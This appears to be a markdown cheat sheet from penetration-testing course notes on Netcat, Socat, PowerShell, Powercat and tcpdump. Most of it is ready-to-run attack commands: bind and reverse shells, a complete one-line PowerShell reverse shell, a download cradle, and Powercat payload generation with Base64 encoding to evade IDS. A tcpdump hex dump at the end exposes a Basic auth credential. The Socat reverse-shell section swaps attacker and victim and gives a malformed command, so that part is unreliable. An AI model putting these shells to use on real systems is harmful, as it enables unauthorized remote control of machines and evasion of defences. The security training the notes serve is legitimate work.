# Practical Tools
## Table of Contents
- [Netcat](#netcat)
  - [Transferring Files with Netcat](#transferring-files-with-netcat)
  - [Remote Administration with Netcat](#remote-administration-with-netcat)
- [Socat](#socat)
  - [Transferring Files with Socat](#transferring-files-with-socat)
  - [Socat Reverse Shell](#socat-reverse-shell)
  - [Socat Encrypted Bind Shell](#socat-encrypted-bind-shell)
- [PowerShell and Powercat](#powershell-and-powercat)
  - [PowerShell File Transfers](#powershell-file-transfers)
  - [PowerShell Reverse Shell](#powershell-reverse-shell)
  - [PowerShell Bind Shell](#powershell-bind-shell)
  - [Powercat](#powercat)
  - [Powercat File Transfers](#powercat-file-transfers)
  - [Powercat Reverse Shell](#powercat-reverse-shell)
  - [Powercat Bind Shell](#powercat-bind-shell)
  - [Powercat Stand-Alone Payloads](#powercat-stand-alone-payloads)
- [Wireshark](#wireshark)
- [Tcpdump](#tcpdump)
  - [Filtering Traffic](#filtering-traffic)
  - [Advanced Header Filtering](#advanced-header-filtering)

## Netcat
- Connecting to a TCP/UDP port
    ```sh
    kali@kali:~$ nc -nv 10.11.0.22 4444       # skip DNS name resolution; Add Verbosity
    ```
- Listening to a TCP/UDP port
    ```sh
    kali@kali:~$ nc -nvlp 4444       # skip DNS name resolution; Add Verbosity
    ```
### Transferring Files with Netcat
- Receive a file
    ```sh
    kali@kali:~$ nc -nvlp 4444 > incoming.exe
    ```
- Send a file
    ```sh
    kali@kali:~$ nc -nv 10.11.0.22 4444 < file.exe 
    ```
### Remote Administration with Netcat
#### Bind Shell
- The victim will bind a shell to a port that the attacker can use upon successful connection.
    ```sh
    kali@kali:~$ nc -nvlp 4444 -e /bin/bash
    ```
- Attacker
    ```sh
    kali@kali:~$ nc -nv 10.11.0.22 4444
    ```
#### Reverse Shell
- The victim will connect to the attacker and send a shell to the host's listening port.
    ```sh
    kali@kali:~$ nc -nv 10.11.0.22 4444 -e /bin/bash
    ```
- Attacker
    ```sh
    kali@kali:~$ nc -nvlp 4444
    ```
⚠️ The **`-e`** option of netcat which allows to have a bind and a reverse shell is not available in most modern Linux/BSD systems.
⚠️ This is why on kali it is present as [`nc.traditional`](https://www.kali.org/tools/netcat/) the version having that specific option.
## Socat 
Connecting to a remote server (socat transfers data between `STDIO` (`-`) and a TCP4 connection to port 80 on a host)
```sh
kali@kali:~$ socat - TCP4:<remote_server_ip_addr>:80
```
Listening to a port
```sh
kali@kali:~$ sudo socat TCP4-LISTEN:433 STDOUT
```
### Transferring Files with Socat
Receive a file
```sh
C:\Users\offsec> socat TCP4:10.11.0.4:433 file:received_file.txt,create
```
Send a file
```cmd
kali@kali:~$ sudo socat TCP4-LISTEN:433,fork file:file.txt
```
### Socat Reverse Shell
attacker
```sh
kali@kali:~$ sudo socat TCP4:10.11.0.4:433 EXEC:/bin/bash
```
victim
```sh
kali@kali:~$ socat TCP4-:433 STDOUT
```
### Socat Encrypted Bind Shell
Use the **`openssl`** application to create a self-signed certificate:
- **`req`*: initiate a new certificate signing request
- newkey: generate a new private key
rsa:2048: use RSA encryption with a 2,048-bit key length.
- nodes: store the private key without passphrase protection
- keyout: save the key to a file
- x509: output a self-signed certificate instead of a certificate request
- days: set validity period in days
- out: save the certificate to a file

```sh
kali@kali:~$ cat bind_shell.key bind_shell.crt > bind_shell.pem
```

victim
```sh
kali@kali:~$ sudo socat OPENSSL-LISTEN:433,cert=bind_shell.pem,verify=0 EXEC:/bin/bash
```
attacker
```sh
C:\Users\offsec> socat OPENSSL:10.11.0.4:433,verify=0
```

## PowerShell and Powercat
- PowerShell maintains an execution policy that determines which type of PowerShell scripts (if any) can be run on the system. 
- The default policy is "Restricted". 
  - The system will neither load PowerShell configuration files nor run PowerShell scripts. 
```powershell
PS C:\WINDOWS\system32> Set-ExecutionPolicy Unrestricted
PS C:\WINDOWS\system32> Get-ExecutionPolicy
Unrestricted
```
### PowerShell File Transfers
```cmd
C:\Users\offsec> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```
- The **-c** option will execute the supplied command (wrapped in double-quotes) as if it were typed at the PowerShell prompt.
- The "new-object" cmdlet allows us to instantiate either a .Net Framework or a COM object. In this case, we are creating an instance of the WebClient class, which is defined and implemented in the System.Net namespace.
- The WebClient class is used to access resources identified by a URI and it exposes a public method called DownloadFile, which requires our two key parameters: a source location (in the form of a URI as we previously stated), and a target location where the retrieved data will be stored.

### PowerShell Reverse Shell
- Victim Windows machine (Replace IP and Port No.)
    ```cmd
    C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    ```
### PowerShell Bind Shell
- Victim Windows machine (Replace Port No.)
    ```cmd
    C:\Users\offsec> powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
    ```
### Powercat
[Powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1) is essentially the PowerShell version of Netcat.
- It is a script we can download to a Windows host to leverage the strengths of PowerShell and simplifies the creation of bind/reverse shells.
> Powercat can be installed in Kali with `apt install powercat`, which will place the script in `/usr/share/windows-resources/powercat`.
- With the script on the target host, we start by using a PowerShell feature known as [Dot-sourcing](https://ss64.com/ps/source.html) to load the `powercat.ps1` script. This will make all variables and functions declared in the script available in the current PowerShell scope.
    ```powershell
    PS C:\Users\Offsec> . .\powercat.ps1
    PS C:\Users\offsec> powercat
    You must select either client mode (-c) or listen mode (-l).
    ```
### Powercat File Transfers
- Using powercat to send a file (itself, to a Kali target)
    ```powershell
    PS C:\Users\Offsec> powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
    ```
### Powercat Reverse Shell
- Victim Windows machine
    ```powershell
    PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe
    ```
### Powercat Bind Shell
- Victim Windows machine
    ```powershell
    PS C:\Users\offsec> powercat -l -p 443 -e cmd.exe
    ```
### Powercat Stand-Alone Payloads
Powercat can also generate stand-alone payloads. In the context of powercat, a payload is a set of powershell instructions as well as the portion of the powercat script itself that only includes the features requested by the user. 

- We create a stand-alone reverse shell payload by adding the **-g** option to the previous powercat command and redirecting the output to a file. This will produce a powershell script that the Victim can execute on his machine:
    ```powershell
    PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
    PS C:\Users\offsec> ./reverseshell.ps1
    ```

> It's worth noting that stand-alone payloads like this one might be easily detected by IDS. Specifically, the script that is generated is rather large with roughly 300 lines of code. Moreover, it also contains a number of hardcoded strings that can easily be used in signatures for malicious activity. While the identification of any specific signature is outside of scope of this module, it is sufficient to say that plaintext malicious code such as this will likely have a poor success rate and will likely be caught by defensive software solutions.

- We can attempt to overcome this problem by making use of PowerShell's ability to execute Base64 encoded commands. To generate a stand-alone encoded payload, we use the **-ge** option and once again redirect the output to a file:
    ```powershell
    PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
    ```
- The file will contain an encoded string that can be executed using the PowerShell **-E** (`EncodedCommand`) option. However, since the **-E** option was designed as a way to submit complex commands on the command line, the resulting encodedreverseshell.ps1 script can not be executed in the same way as our unencoded payload. Instead, Bob needs to pass the whole encoded string to powershell.exe -E:
    ```powershell
    PS C:\Users\offsec> powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA
    ```

## Wireshark

## Tcpdump
Tcpdump is a text-based network sniffer that is streamlined, powerful, and flexible despite the lack of a graphical interface. It is by far the most commonly-used command-line packet analyzer and can be found on most Unix and Linux operating systems, but local user permissions determine the ability to capture network traffic.

Tcpdump can both capture traffic from the network and read existing capture files.
```sh
kali@kali:~$ sudo tcpdump -r password_cracking_filtered.pcap
reading from file password_cracking_filtered.pcap, link-type EN10MB (Ethernet)
08:51:20.800917 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074, win 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0
...
```
### Filtering Traffic
The output is a bit overwhelming at first, so let's try to get a better understanding of the IP addresses and ports involved by using awk and sort.

- Use the **-n** option to skip DNS name lookups and **-r** to read from our packet capture file. 
- Then, pipe the output into awk, printing the destination IP address and port (the third space-separated field) and pipe it again to sort and uniq -c to sort and count the number of times the field appears in the capture, respectively. Lastly we use head to only display the first 10 lines of the output:
    ```sh
    kali@kali:~$ sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $5}' | sort | uniq -c | head
      20164 172.16.40.10.81:
         14 208.68.234.99.32768:
         14 208.68.234.99.32769:
          6 208.68.234.99.32770:
         14 208.68.234.99.32771:
          6 208.68.234.99.32772:
          6 208.68.234.99.32773:
         15 208.68.234.99.32774:
         12 208.68.234.99.32775:
          6 208.68.234.99.32776:
    ...
    ```

- In order to filter from the command line, we will use the source host (src host) and destination host (dst host) filters to output only source and destination traffic respectively. We can also filter by port number (-n port 81) to show both source and destination traffic against port 81. Let's try those filters now:
    ```sh
    sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
    ...
    08:51:20.801051 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389, ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,wscale 4], length 0
    08:51:20.802053 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [.], ack 89, win 905, options [nop,nop,TS val 71430591 ecr 25538253], length 0
    ...

    sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap
    ...
    08:51:20.801048 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074, win 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0
    08:51:20.802026 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [.], ack 4166855390, win 115, options [nop,nop,TS val 25538253 ecr 71430591], length 0
    ...

    sudo tcpdump -n port 81 -r password_cracking_filtered.pcap
    ...
    08:51:20.800917 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074, win 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0
    08:51:20.800953 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389, ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,wscale 4], length 0
    ...
    ```

We could continue to process this filtered output with various command-line utilities like awk and grep, but let's move along and actually inspect some packets in more detail to see what kind of details we can uncover.

- To dump the captured traffic, we will use the **-X** option to print the packet data in both HEX and ASCII format:
    ```sh
    kali@kali:~$ sudo tcpdump -nX -r password_cracking_filtered.pcap
    ...
    08:51:25.043062 IP 208.68.234.99.33313 > 172.16.40.10.81: Flags [P.], seq 1:140, ack 1
      0x0000:  4500 00bf 158c 4000 3906 9cea d044 ea63  E.....@.9....D.c
      0x0010:  ac10 280a 8221 0051 a726 a77c 6fd8 ee8a  ..(..!.Q.&.|o...
      0x0020:  8018 0073 1c76 0000 0101 080a 0185 b2f2  ...s.v..........
      0x0030:  0441 f5e3 4745 5420 2f2f 6164 6d69 6e20  .A..GET.//admin.
      0x0040:  4854 5450 2f31 2e31 0d0a 486f 7374 3a20  HTTP/1.1..Host:.
      0x0050:  6164 6d69 6e2e 6d65 6761 636f 7270 6f6e  admin.megacorpon
      0x0060:  652e 636f 6d3a 3831 0d0a 5573 6572 2d41  e.com:81..User-A
      0x0070:  6765 6e74 3a20 5465 6820 466f 7265 7374  gent:.Teh.Forest
      0x0080:  204c 6f62 7374 6572 0d0a 4175 7468 6f72  .Lobster..Author
      0x0090:  697a 6174 696f 6e3a 2042 6173 6963 2059  ization:.Basic.Y
      0x00a0:  5752 7461 5734 3662 6d46 7562 3352 6c59  WRtaW46bmFub3RlY
      0x00b0:  3268 7562 3278 765a 336b 780d 0a0d 0a    2hub2xvZ3kx....
    ...
    ```
### Advanced Header Filtering
